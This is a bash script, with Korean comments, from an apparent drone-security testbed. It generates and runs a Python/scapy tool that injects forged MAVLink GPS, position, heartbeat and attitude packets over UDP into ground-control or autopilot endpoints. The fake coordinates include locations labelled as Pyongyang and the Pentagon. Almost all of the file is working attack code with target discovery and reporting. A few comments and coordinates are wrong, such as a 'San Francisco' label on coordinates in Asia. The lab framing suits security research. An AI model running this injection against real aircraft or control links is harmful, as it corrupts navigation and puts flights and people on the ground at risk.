#!/bin/bash

# =============================================================================
# DVD Protocol Tampering Module: GPS Spoofing Attack
# =============================================================================
# 파일: /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/protocol_tampering/gps_spoofing.sh
# 목적: GPS 신호 스푸핑을 통한 드론 위치 정보 조작
# 작성자: MTD Testbed Team
# =============================================================================

# 공통 모듈 로드
source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/colors.sh
source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/utils.sh

# 전역 변수
ATTACK_NAME="GPS Spoofing Attack"
ATTACK_TYPE="PROTOCOL_TAMPERING"
TARGET_IP="10.13.0.6"
TARGET_PORT="14550"
LOG_FILE="/home/kali/MTD/MTD_full_testbed/attack_logs/protocol_tampering/gps_spoofing_$(date +%Y%m%d_%H%M%S).log"
IOC_FILE="/tmp/gps_spoofing_iocs.txt"
JSON_OUTPUT="/home/kali/MTD/MTD_full_testbed/attack_output/protocol_tampering/gps_spoofing_report_$(date +%Y%m%d_%H%M%S).json"
PYTHON_SCRIPT="/tmp/gps_spoofing_attack.py"

# 가짜 GPS 좌표 (다양한 위치)
declare -A FAKE_LOCATIONS=(
    ["NORTH_KOREA"]="lat=393984000,lon=1259885000"      # 평양
    ["RUSSIA"]="lat=559337000,lon=373139000"            # 모스크바  
    ["IRAN"]="lat=357000000,lon=510000000"              # 테헤란
    ["ANTARCTICA"]="lat=-900000000,lon=0"               # 남극
    ["OCEAN"]="lat=0,lon=0"                             # 대서양 한가운데
    ["AIRPORT"]="lat=377000000,lon=-1221000000"         # 샌프란시스코 공항
    ["MILITARY_BASE"]="lat=389000000,lon=-770000000"    # 펜타곤 근처
    ["FORBIDDEN_ZONE"]="lat=395000000,lon=1162000000"   # 베이징 금단의 성
)

# 헤더 출력
print_header() {
    clear
    echo -e "${BOLD}${RED}"
    echo "╔═══════════════════════════════════════════════════════════════════════════╗"
    echo "║                      🛰️ DVD GPS Spoofing Attack 🛰️                      ║"
    echo "╚═══════════════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    echo -e "${BLUE}Target: GPS Navigation System${NC}"
    echo -e "${BLUE}Method: False Coordinate Injection${NC}"
    echo -e "${BLUE}Impact: Navigation System Compromise${NC}"
    echo ""
}

# 타겟 탐지 및 설정
detect_targets() {
    echo -e "${YELLOW}[+] Detecting available MAVLink targets...${NC}" | tee -a "$LOG_FILE"
    
    # 공통 MAVLink 타겟들
    local targets=(
        "10.13.0.6:14550"    # QGroundControl (Bridge)
        "192.168.13.14:14550" # MAVProxy (WiFi)
        "10.13.0.4:14550"    # MAVProxy (Bridge)
        "127.0.0.1:14550"    # Local SITL
        "127.0.0.1:14551"    # Secondary SITL
    )
    
    local available_targets=()
    
    for target in "${targets[@]}"; do
        local ip=$(echo "$target" | cut -d':' -f1)
        local port=$(echo "$target" | cut -d':' -f2)
        
        if timeout 3 nc -z "$ip" "$port" 2>/dev/null; then
            echo -e "${GREEN}[✓] Found MAVLink service: ${target}${NC}" | tee -a "$LOG_FILE"
            available_targets+=("$target")
            echo "GPS_TARGET:DISCOVERED_${target}" >> "$IOC_FILE"
        else
            echo -e "${RED}[✗] No service on: ${target}${NC}" | tee -a "$LOG_FILE"
        fi
    done
    
    if [ ${#available_targets[@]} -gt 0 ]; then
        TARGET_IP=$(echo "${available_targets[0]}" | cut -d':' -f1)
        TARGET_PORT=$(echo "${available_targets[0]}" | cut -d':' -f2)
        echo -e "${GREEN}[✓] Primary target set: ${TARGET_IP}:${TARGET_PORT}${NC}" | tee -a "$LOG_FILE"
        echo "GPS_TARGET:SELECTED_${TARGET_IP}:${TARGET_PORT}" >> "$IOC_FILE"
        return 0
    else
        echo -e "${YELLOW}[!] No live targets found, using simulation mode${NC}" | tee -a "$LOG_FILE"
        echo "GPS_TARGET:SIMULATION_MODE" >> "$IOC_FILE"
        return 1
    fi
}

# GPS 스푸핑 Python 스크립트 생성
create_gps_spoofing_script() {
    echo -e "${CYAN}[*] Creating GPS spoofing Python script...${NC}" | tee -a "$LOG_FILE"
    
    cat > "$PYTHON_SCRIPT" << 'EOF'
#!/usr/bin/env python3
from pymavlink import mavutil
from scapy.all import *
import time
import sys
import random
import signal

class GPSSpoofingAttack:
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = int(target_port)
        self.running = True
        self.packets_sent = 0
        
        # 가짜 GPS 좌표 설정
        self.fake_coords = {
            'lat': 473566100,    # 47.3566100 (샌프란시스코 근처)
            'lon': 854619300,    # 85.4619300 (위험 지역)
            'alt': 1500          # 1.5km 고도
        }
        
        signal.signal(signal.SIGINT, self.signal_handler)
    
    def signal_handler(self, signum, frame):
        print(f"\n[!] Attack interrupted. Sent {self.packets_sent} spoofed packets.")
        self.running = False
        sys.exit(0)
    
    def create_heartbeat(self):
        """정상적인 하트비트 메시지 생성"""
        mav = mavutil.mavlink.MAVLink(None)
        mav.srcSystem = 1
        mav.srcComponent = 1
        
        return mav.heartbeat_encode(
            type=mavutil.mavlink.MAV_TYPE_QUADROTOR,
            autopilot=mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
            base_mode=mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
            custom_mode=3,
            system_status=mavutil.mavlink.MAV_STATE_ACTIVE
        ).pack(mav)
    
    def create_gps_raw_int(self):
        """가짜 GPS RAW 데이터 생성"""
        mav = mavutil.mavlink.MAVLink(None)
        mav.srcSystem = 1
        mav.srcComponent = 1
        
        return mav.gps_raw_int_encode(
            time_usec=int(time.time() * 1e6),
            fix_type=3,  # 3D Fix
            lat=self.fake_coords['lat'],
            lon=self.fake_coords['lon'],
            alt=self.fake_coords['alt'],
            eph=100,     # GPS HDOP
            epv=100,     # GPS VDOP
            vel=500,     # GPS 속도 (cm/s)
            cog=0,       # Course over ground
            satellites_visible=10  # 위성 개수
        ).pack(mav)
    
    def create_global_position_int(self):
        """가짜 글로벌 위치 데이터 생성"""
        mav = mavutil.mavlink.MAVLink(None)
        mav.srcSystem = 1
        mav.srcComponent = 1
        
        return mav.global_position_int_encode(
            time_boot_ms=int(time.time() * 1e3) % 4294967295,
            lat=self.fake_coords['lat'],
            lon=self.fake_coords['lon'],
            alt=self.fake_coords['alt'] * 1000,  # mm 단위
            relative_alt=self.fake_coords['alt'] * 1000,
            vx=0,   # X 속도
            vy=0,   # Y 속도
            vz=0,   # Z 속도
            hdg=0   # 방향각
        ).pack(mav)
    
    def create_attitude(self):
        """정상적인 자세 데이터 생성 (혼란 가중)"""
        mav = mavutil.mavlink.MAVLink(None)
        mav.srcSystem = 1
        mav.srcComponent = 1
        
        return mav.attitude_encode(
            time_boot_ms=int(time.time() * 1e3) % 4294967295,
            roll=0.1,
            pitch=0.1,
            yaw=1.0,
            rollspeed=0.01,
            pitchspeed=0.01,
            yawspeed=0.1
        ).pack(mav)
    
    def send_mavlink_packet(self, packet_data):
        """MAVLink 패킷 전송"""
        try:
            packet = IP(dst=self.target_ip) / UDP(dport=self.target_port) / Raw(load=packet_data)
            send(packet, verbose=False)
            self.packets_sent += 1
            return True
        except Exception as e:
            print(f"[!] Packet send failed: {e}")
            return False
    
    def dynamic_coordinate_spoofing(self):
        """동적 좌표 변경으로 혼란 가중"""
        # 좌표를 점진적으로 변경
        drift_lat = random.randint(-1000, 1000)  # ±0.001도 드리프트
        drift_lon = random.randint(-1000, 1000)
        
        self.fake_coords['lat'] += drift_lat
        self.fake_coords['lon'] += drift_lon
        
        # 고도도 랜덤하게 변경
        self.fake_coords['alt'] = random.randint(100, 3000)
    
    def execute_attack(self):
        """GPS 스푸핑 공격 실행"""
        print(f"[+] Starting GPS spoofing attack on {self.target_ip}:{self.target_port}")
        print(f"[*] Spoofing coordinates: {self.fake_coords}")
        print("[*] Press Ctrl+C to stop the attack")
        
        packet_count = 0
        
        while self.running:
            try:
                # 하트비트 전송
                if self.send_mavlink_packet(self.create_heartbeat()):
                    pass
                
                # GPS RAW 데이터 전송
                if self.send_mavlink_packet(self.create_gps_raw_int()):
                    pass
                
                # 글로벌 위치 데이터 전송
                if self.send_mavlink_packet(self.create_global_position_int()):
                    pass
                
                # 자세 데이터 전송
                if self.send_mavlink_packet(self.create_attitude()):
                    pass
                
                packet_count += 1
                
                if packet_count % 10 == 0:
                    print(f"[*] Sent {self.packets_sent} spoofed GPS packets...")
                    # 동적 좌표 변경
                    self.dynamic_coordinate_spoofing()
                
                time.sleep(1)  # 1초마다 전송
                
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"[!] Error during attack: {e}")
                break
        
        print(f"[+] GPS spoofing attack completed. Total packets sent: {self.packets_sent}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 gps_spoofing_attack.py <target_ip> <target_port>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = sys.argv[2]
    
    attack = GPSSpoofingAttack(target_ip, target_port)
    attack.execute_attack()
EOF
    
    chmod +x "$PYTHON_SCRIPT"
    echo -e "${GREEN}[✓] GPS spoofing script created: ${PYTHON_SCRIPT}${NC}" | tee -a "$LOG_FILE"
    echo "GPS_SCRIPT:CREATED_${PYTHON_SCRIPT}" >> "$IOC_FILE"
}

# 의존성 확인 및 설치
check_dependencies() {
    echo -e "${YELLOW}[+] Checking required dependencies...${NC}" | tee -a "$LOG_FILE"
    
    local missing_deps=()
    
    # Python3 확인
    if ! command -v python3 &> /dev/null; then
        missing_deps+=("python3")
    fi
    
    # pip3 확인  
    if ! command -v pip3 &> /dev/null; then
        missing_deps+=("python3-pip")
    fi
    
    # 기본 패키지 설치 확인
    if [ ${#missing_deps[@]} -gt 0 ]; then
        echo -e "${YELLOW}[*] Installing missing dependencies: ${missing_deps[*]}${NC}" | tee -a "$LOG_FILE"
        apt-get update -qq
        apt-get install -y "${missing_deps[@]}" 2>&1 | tee -a "$LOG_FILE"
    fi
    
    # Python 라이브러리 설치
    echo -e "${YELLOW}[*] Installing Python libraries...${NC}" | tee -a "$LOG_FILE"
    
    pip3 install pymavlink scapy 2>&1 | tee -a "$LOG_FILE"
    
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}[✓] All dependencies installed successfully${NC}" | tee -a "$LOG_FILE"
        echo "GPS_DEPS:INSTALLED_SUCCESSFULLY" >> "$IOC_FILE"
        return 0
    else
        echo -e "${RED}[!] Failed to install dependencies${NC}" | tee -a "$LOG_FILE"
        echo "GPS_DEPS:INSTALLATION_FAILED" >> "$IOC_FILE"
        return 1
    fi
}

# GPS 스푸핑 공격 실행
execute_gps_spoofing() {
    echo -e "${BOLD}${RED}🛰️ Executing GPS Spoofing Attack...${NC}"
    echo ""
    
    local attack_duration=60  # 60초 공격
    local start_time=$(date +%s)
    
    echo -e "${CYAN}[*] Starting GPS coordinate spoofing...${NC}" | tee -a "$LOG_FILE"
    echo -e "${YELLOW}[*] Target: ${TARGET_IP}:${TARGET_PORT}${NC}" | tee -a "$LOG_FILE"
    echo -e "${YELLOW}[*] Duration: ${attack_duration} seconds${NC}" | tee -a "$LOG_FILE"
    
    # Python 스크립트를 백그라운드에서 실행
    timeout "$attack_duration" python3 "$PYTHON_SCRIPT" "$TARGET_IP" "$TARGET_PORT" &
    local attack_pid=$!
    
    echo "GPS_ATTACK:STARTED_PID_${attack_pid}_$(date +%s)" >> "$IOC_FILE"
    
    # 진행률 표시
    for ((i=1; i<=attack_duration; i++)); do
        printf "\r${RED}GPS Spoofing: [%-30s] %d/${attack_duration}s${NC}" \
               "$(printf "%*s" $((i*30/attack_duration)) | tr ' ' '█')" "$i"
        
        # 중간 IOC 생성
        if [ $((i % 10)) -eq 0 ]; then
            echo "GPS_SPOOF:COORDINATES_INJECTED_$(date +%s)" >> "$IOC_FILE"
        fi
        
        sleep 1
    done
    echo ""
    
    # 공격 프로세스 종료
    if kill -0 $attack_pid 2>/dev/null; then
        kill -TERM $attack_pid 2>/dev/null
        sleep 2
        kill -KILL $attack_pid 2>/dev/null
    fi
    
    local end_time=$(date +%s)
    local total_duration=$((end_time - start_time))
    
    echo -e "${GREEN}[✓] GPS spoofing attack completed${NC}" | tee -a "$LOG_FILE"
    echo -e "${BLUE}[*] Attack duration: ${total_duration} seconds${NC}" | tee -a "$LOG_FILE"
    
    echo "GPS_ATTACK:COMPLETED_DURATION_${total_duration}s_$(date +%s)" >> "$IOC_FILE"
    
    return 0
}

# 다중 위치 스푸핑 공격
execute_multi_location_spoofing() {
    echo -e "${CYAN}[*] Executing multi-location spoofing attack...${NC}" | tee -a "$LOG_FILE"
    
    local location_count=0
    
    for location in "${!FAKE_LOCATIONS[@]}"; do
        echo -e "${YELLOW}[*] Spoofing location: ${location}${NC}" | tee -a "$LOG_FILE"
        
        # 좌표 추출
        local coords=${FAKE_LOCATIONS[$location]}
        local lat=$(echo "$coords" | sed 's/.*lat=\([^,]*\).*/\1/')
        local lon=$(echo "$coords" | sed 's/.*lon=\([^,]*\).*/\1/')
        
        echo -e "${BLUE}[*] Coordinates: LAT=${lat}, LON=${lon}${NC}" | tee -a "$LOG_FILE"
        
        # 각 위치별로 15초씩 스푸핑
        local spoof_duration=15
        
        # 임시 스크립트 생성 (좌표 변경)
        sed "s/473566100/${lat}/g; s/854619300/${lon}/g" "$PYTHON_SCRIPT" > "/tmp/gps_spoof_${location}.py"
        
        timeout "$spoof_duration" python3 "/tmp/gps_spoof_${location}.py" "$TARGET_IP" "$TARGET_PORT" &
        local spoof_pid=$!
        
        # 진행률 표시
        for ((j=1; j<=spoof_duration; j++)); do
            printf "\r${RED}${location}: [%-15s] %d/${spoof_duration}s${NC}" \
                   "$(printf "%*s" $((j*15/spoof_duration)) | tr ' ' '█')" "$j"
            sleep 1
        done
        echo ""
        
        # 프로세스 정리
        kill -TERM $spoof_pid 2>/dev/null
        rm -f "/tmp/gps_spoof_${location}.py"
        
        location_count=$((location_count + 1))
        echo "GPS_MULTI:LOCATION_${location}_SPOOFED_$(date +%s)" >> "$IOC_FILE"
        
        # 위치 간 대기 시간
        sleep 2
    done
    
    echo -e "${GREEN}[✓] Multi-location spoofing completed: ${location_count} locations${NC}" | tee -a "$LOG_FILE"
    echo "GPS_MULTI:COMPLETED_${location_count}_LOCATIONS" >> "$IOC_FILE"
}

# 공격 효과 모니터링
monitor_attack_effectiveness() {
    echo -e "${CYAN}[*] Monitoring GPS spoofing effectiveness...${NC}" | tee -a "$LOG_FILE"
    
    # 네트워크 트래픽 분석
    local before_packets=$(ss -u | grep -c "$TARGET_PORT" || echo "0")
    sleep 5
    local after_packets=$(ss -u | grep -c "$TARGET_PORT" || echo "0")
    
    echo -e "${BLUE}[*] Network activity analysis:${NC}" | tee -a "$LOG_FILE"
    echo "    UDP connections before: ${before_packets}" | tee -a "$LOG_FILE"
    echo "    UDP connections after: ${after_packets}" | tee -a "$LOG_FILE"
    
    # GPS 스푸핑 영향 평가
    local spoofed_packets=$(grep -c "GPS_SPOOF" "$IOC_FILE" 2>/dev/null || echo "0")
    local attack_duration=$(grep "GPS_ATTACK:COMPLETED" "$IOC_FILE" | tail -1 | sed 's/.*DURATION_\([0-9]*\)s.*/\1/' || echo "0")
    
    echo -e "${GREEN}[✓] GPS Spoofing Impact Assessment:${NC}" | tee -a "$LOG_FILE"
    echo "    Spoofed Packets Sent: ${spoofed_packets}" | tee -a "$LOG_FILE"
    echo "    Attack Duration: ${attack_duration} seconds" | tee -a "$LOG_FILE"
    echo "    Coordinate Manipulation: HIGH" | tee -a "$LOG_FILE"
    echo "    Navigation Reliability: COMPROMISED" | tee -a "$LOG_FILE"
    
    # IOCs 업데이트
    echo "GPS_IMPACT:PACKETS_SENT_${spoofed_packets}" >> "$IOC_FILE"
    echo "GPS_IMPACT:NAVIGATION_COMPROMISED" >> "$IOC_FILE"
    echo "GPS_IMPACT:POSITION_UNRELIABLE" >> "$IOC_FILE"
}

# JSON 리포트 생성
generate_json_report() {
    local start_time=$1
    local end_time=$2
    
    cat > "$JSON_OUTPUT" << EOF
{
    "attack_info": {
        "name": "$ATTACK_NAME",
        "type": "$ATTACK_TYPE",
        "timestamp": "$(date -Iseconds)",
        "duration": $((end_time - start_time)),
        "status": "completed"
    },
    "target_details": {
        "target_ip": "$TARGET_IP",
        "target_port": "$TARGET_PORT",
        "protocol": "MAVLink over UDP",
        "attack_method": "GPS Coordinate Spoofing"
    },
    "spoofing_parameters": {
        "fake_coordinates": {
            "latitude": "47.3566100",
            "longitude": "85.4619300", 
            "altitude": "1500m"
        },
        "attack_vectors": [
            "GPS_RAW_INT message injection",
            "GLOBAL_POSITION_INT manipulation",
            "Multi-location coordinate spoofing"
        ],
        "tools_used": ["pymavlink", "scapy", "python3"]
    },
    "impact_assessment": {
        "navigation_integrity": "COMPROMISED",
        "position_accuracy": "UNRELIABLE",
        "flight_safety": "AT_RISK",
        "mission_success": "THREATENED",
        "detection_probability": "MEDIUM"
    },
    "iocs_generated": $(wc -l < "$IOC_FILE"),
    "log_file": "$LOG_FILE",
    "ioc_file": "$IOC_FILE"
}
EOF
    
    echo -e "${GREEN}[✓] JSON report generated: ${JSON_OUTPUT}${NC}"
}

# 메인 공격 실행
main() {
    print_header
    
    # Root 권한 체크
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[!] This attack requires root privileges${NC}"
        echo -e "${YELLOW}[*] Please run: sudo $0${NC}"
        exit 1
    fi
    
    # 로그 초기화
    echo "=== DVD GPS Spoofing Attack Started at $(date) ===" > "$LOG_FILE"
    echo "" > "$IOC_FILE"
    
    local start_time=$(date +%s)
    
    echo -e "${BOLD}${BLUE}🛰️ Starting GPS Spoofing Attack...${NC}"
    echo ""
    
    # 1. 의존성 확인
    if ! check_dependencies; then
        echo -e "${RED}[!] Failed to install required dependencies${NC}"
        exit 1
    fi
    
    # 2. 타겟 탐지
    detect_targets
    
    # 3. GPS 스푸핑 스크립트 생성
    create_gps_spoofing_script
    
    # 4. 기본 GPS 스푸핑 공격 실행
    execute_gps_spoofing
    
    # 5. 다중 위치 스푸핑 공격
    echo ""
    echo -e "${BOLD}${YELLOW}🌍 Multi-Location Spoofing Attack...${NC}"
    execute_multi_location_spoofing
    
    # 6. 공격 효과 모니터링
    monitor_attack_effectiveness
    
    local end_time=$(date +%s)
    
    echo ""
    echo -e "${BOLD}${GREEN}🛰️ GPS Spoofing Attack Completed!${NC}"
    echo ""
    echo -e "${GREEN}📊 Attack Summary:${NC}"
    echo "   • Duration: $((end_time - start_time)) seconds"
    echo "   • Target: ${TARGET_IP}:${TARGET_PORT}"
    echo "   • Spoofing Method: MAVLink GPS Message Injection"
    echo "   • Locations Spoofed: ${#FAKE_LOCATIONS[@]}"
    echo "   • IOCs Generated: $(wc -l < "$IOC_FILE")"
    echo ""
    echo -e "${BLUE}📁 Output Files:${NC}"
    echo "   • Log: ${LOG_FILE}"
    echo "   • IOCs: ${IOC_FILE}"
    echo "   • JSON Report: ${JSON_OUTPUT}"
    echo "   • Attack Script: ${PYTHON_SCRIPT}"
    
    # JSON 리포트 생성
    generate_json_report "$start_time" "$end_time"
    
    echo ""
    echo -e "${YELLOW}💡 Next Steps:${NC}"
    echo "   1. Monitor Ground Control Station for spoofed coordinates"
    echo "   2. Check for automated safety responses (RTL, Landing)"
    echo "   3. Analyze flight controller GPS status messages"
    echo "   4. Review telemetry logs for position discrepancies"
    echo ""
    
    # IOCs 요약 출력
    echo -e "${BOLD}${CYAN}🔍 Generated IOCs Summary:${NC}"
    cat "$IOC_FILE" | sort | uniq -c | head -10
    echo ""
    
    # 정리
    rm -f "$PYTHON_SCRIPT"
}

# cleanup 함수
cleanup() {
    echo -e "\n${YELLOW}[*] Cleaning up GPS spoofing attack...${NC}"
    
    # Python 프로세스 정리
    pkill -f "gps_spoofing_attack.py" 2>/dev/null
    pkill -f "gps_spoof_" 2>/dev/null
    
    # 임시 파일 정리
    rm -f "$PYTHON_SCRIPT"
    rm -f /tmp/gps_spoof_*.py
    
    echo -e "${GREEN}[✓] GPS spoofing cleanup complete${NC}"
    exit 0
}

# SIGINT 시그널 처리
trap cleanup SIGINT SIGTERM

# 스크립트 실행
main "$@"